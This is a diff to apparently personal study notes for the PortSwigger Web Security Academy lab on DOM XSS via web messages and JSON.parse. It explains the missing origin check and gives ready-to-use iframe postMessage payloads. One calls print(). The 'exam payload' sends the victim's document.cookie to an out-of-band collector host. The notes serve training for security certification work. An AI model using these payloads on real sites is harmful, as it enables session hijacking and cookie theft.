@@ -120,20 +120,14 @@ git-cola --repo TARGET.web-security-academy.net/
 **3. DOM XSS using web messages and JSON.parse**
 
 - Signal: the event listener runs `JSON.parse(e.data)` before using the result: it expects a `type` property, and inside a `switch` the matching case (e.g. `"load-channel"`) assigns the message's `url` property to the `src` of an inner iframe, without checking `e.origin` or validating the URL's scheme.
-- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with the serialized (`JSON.stringify`) string below, which sets `type` to the value the `switch` expects and `url` to a `javascript:` payload, exploiting the missing origin/scheme check to get the payload set as the inner iframe's `src`.
-- Payload (message content):
-```json
-{
-    "type": "load-channel",
-    "url": "javascript:print()"
-}
+- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with the JSON string (serialized with `JSON.stringify`) that sets `type` to the value the `switch` expects and `url` to a `javascript:` payload, exploiting the missing origin/scheme check to get the payload set as the inner iframe's `src`.
+- Payload:
+```html
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
-- Exam payload (Burp Collaborator/OAST): exfiltrates the cookie instead of calling `print()`.
-```json
-{
-    "type": "load-channel",
-    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
-}
+- Exam payload (Burp Collaborator/OAST): exfiltrates the cookie instead of calling `print()`; backticks (template literal) are used for the collector URL so no quotes are needed that would break the `onload` attribute.
+```html
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie\"}","*")'>
 ```
 - Link: [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 - Step: 1
